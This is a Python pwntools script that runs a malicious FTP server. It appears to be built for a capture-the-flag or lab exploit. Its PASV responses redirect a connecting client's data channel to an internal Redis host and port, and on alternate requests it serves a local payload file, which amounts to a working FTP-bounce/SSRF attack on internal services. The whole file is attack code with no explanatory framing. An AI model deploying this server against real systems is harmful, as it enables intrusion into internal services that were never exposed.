from pwn import *
import threading
import subprocess
from base64 import b64encode
import os

TARGET_FILE = "a.txt"

context.log_level = "debug"

SRV_PORT = 3535
TARGET = "172.18.0.2"
# TARGET = "localhost"
TARGET_PORT = 6379

DATA_PORT = 3536
PUBLIC_IP = "172.17.0.1"




def data_thread():
    srv = listen(DATA_PORT)
    srv.wait_for_connection()
    with open(TARGET_FILE, "rb") as f:
        srv.send(f.read())
    srv.close()

cnt = 0
def handle(srv):
    global cnt
    is_retr = False
    srv.send(b"220 welcome\n")
    while True:
        data = srv.recvline()
        log.info(data)
        cmd, *args = data.strip().split(b" ")
        if cmd == b"USER":
            srv.send(b"331 Please specify the password.\n")
        elif cmd == b"PASS":
            srv.send(b"230 Login successful.\n")
        elif cmd == b"CWD":
            srv.send(b"250 Okay.\n")
        elif cmd == b"TYPE":
            srv.send(b"200 Switching\n")
        elif cmd == b"SIZE":
            cnt += 1
            if args[0].endswith(b'/' + TARGET_FILE.encode()) and cnt % 2 == 1:
                is_retr = True
                with open(TARGET_FILE, "rb") as f:
                    ln = len(f.read())
                srv.send(f"213 {ln}\n".encode())
            else:
                is_retr = False
                srv.send(b"550 NO\n")
        elif cmd == b"RETR":
            srv.send(b"150 Opening data connection.\n")
            time.sleep(1)
            srv.send(b"250 Ok\n")
        elif cmd == b"PWD":
            srv.send(b'257 "/"\n')
        elif cmd == b"EPSV":
            srv.send(b"250 ok\n")
        elif cmd == b"PASV":
            if is_retr:
                threading.Thread(target=data_thread).start()
                ip = PUBLIC_IP.replace(".", ",")
                log.info("Enter PassiveMode")
                srv.send(
                    f"227 Entering Passive Mode ({ip},{DATA_PORT//256},{DATA_PORT%256})\n".encode()
                )
            else:
                ip = TARGET.replace(".", ",")
                log.info("Enter ExtendedPassiveMode")
                srv.send(
                    f"227 Entering Extended Passive Mode ({ip},{TARGET_PORT//256},{TARGET_PORT%256})\n".encode()
                )
        elif cmd == b"STOR":
            log.info("write file")
            srv.send(b"150 Opening data connection.\n")
            time.sleep(2)
            srv.send(b"250 Ok\n")
            # srv.send(b"150 no\n")
        else:
            # including QUIT
            srv.send(b"221 Goodbye.\n")
            srv.close()
            break
while True:
    srv = listen(SRV_PORT)
    srv.wait_for_connection()
    threading.Thread(target=handle, args=(srv,)).start()
